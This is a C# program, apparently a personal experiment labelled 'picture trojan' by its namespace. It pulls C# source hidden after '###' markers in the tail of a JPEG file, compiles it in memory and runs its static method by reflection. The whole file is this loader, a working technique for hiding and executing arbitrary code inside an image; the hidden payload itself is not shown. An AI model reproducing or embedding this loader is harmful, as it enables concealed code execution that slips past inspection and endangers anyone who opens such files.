using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace _2017_02_20_图片木马
{
    class Program
    {
        static void Main(string[] args)
        {

            FileStream fs = new FileStream("1.jpg", FileMode.Open, FileAccess.Read);
            Console.WriteLine(fs.Length);
            byte[] buffer = new byte[1024 * 5];
            StringBuilder sb = new StringBuilder();
            int begin=(int)fs.Length-1 - buffer.Length;
            //Console.WriteLine();
            Console.WriteLine(begin);
            Console.WriteLine(begin+buffer.Length);
            fs.Seek(begin, SeekOrigin.Begin);
            fs.Read(buffer, 0, buffer.Length);
            string str = Encoding.Default.GetString(buffer);
            Console.WriteLine(str);
            string[] arr = str.Split(new String[] { "###" }, StringSplitOptions.RemoveEmptyEntries);
            string res = arr[1];
            Console.WriteLine(res);

            //Type t = res.GetType();
            CSharpCodeProvider objCSharpCodePrivoder = new CSharpCodeProvider();

            CompilerParameters objCompilerParameters = new CompilerParameters();
            objCompilerParameters.GenerateExecutable = false;  //true  ok
            objCompilerParameters.GenerateInMemory = true;
          //  objCompilerParameters.ReferencedAssemblies.Add("System.dll");  // ok  
            CompilerResults cresult = objCSharpCodePrivoder.CompileAssemblyFromSource(objCompilerParameters, res);
            //Console.WriteLine(cresult.Output);
            Console.WriteLine(cresult.Errors.HasErrors);
            //Console.WriteLine();
            if (cresult.Errors.HasErrors)
            {
                foreach (CompilerError err in cresult.Errors)
                {
                    //MessageBox.Show(err.ErrorText);
                    Console.WriteLine(err.ErrorText);
                }
            }
            //Console.WriteLine(cresult.Output);
            Assembly objAssembly = cresult.CompiledAssembly;
            Type t1 = objAssembly.GetType();
            foreach (Type t in objAssembly.GetTypes())
            {

                Console.WriteLine(t);
                t1 = t;
            }
            
            

            BindingFlags anyStatic = BindingFlags.DeclaredOnly | BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic;
            MethodInfo[] methods = t1.GetMethods(anyStatic);
            MethodInfo mbi = null;
            foreach (MethodInfo item in methods)
            {
                mbi = item;
                Console.WriteLine(item);
            }

            //会将oject的数组中的第一个值传递给方法参数位置
            mbi.Invoke(null, new object[]{new string []{"1","2"}});

            //String idStr = "YAya";  
 
            //mbi.Invoke(null,null,null,new object[]{""},null);
            //mbi.Invoke(null,args);
            //new Thread(() => mbi.Invoke(null, args)).Start();
            //object obj = objAssembly.CreateInstance("ConsoleApp1.Program");
            //mbi.Invoke(null, null);
            //mbi.Invoke(obj,);
            //ConsoleApp1.Program
            
            //MethodInfo objMI = obj.GetType().GetMethod("main");
            //Console.WriteLine("-----------");
            //foreach (MemberInfo item in obj.GetType().GetMethods())
            //{
            //    Console.WriteLine(item);
            //}
            //Console.WriteLine(obj);
           // Console.WriteLine(t1);
            Console.WriteLine("ok");
        }
    }
}
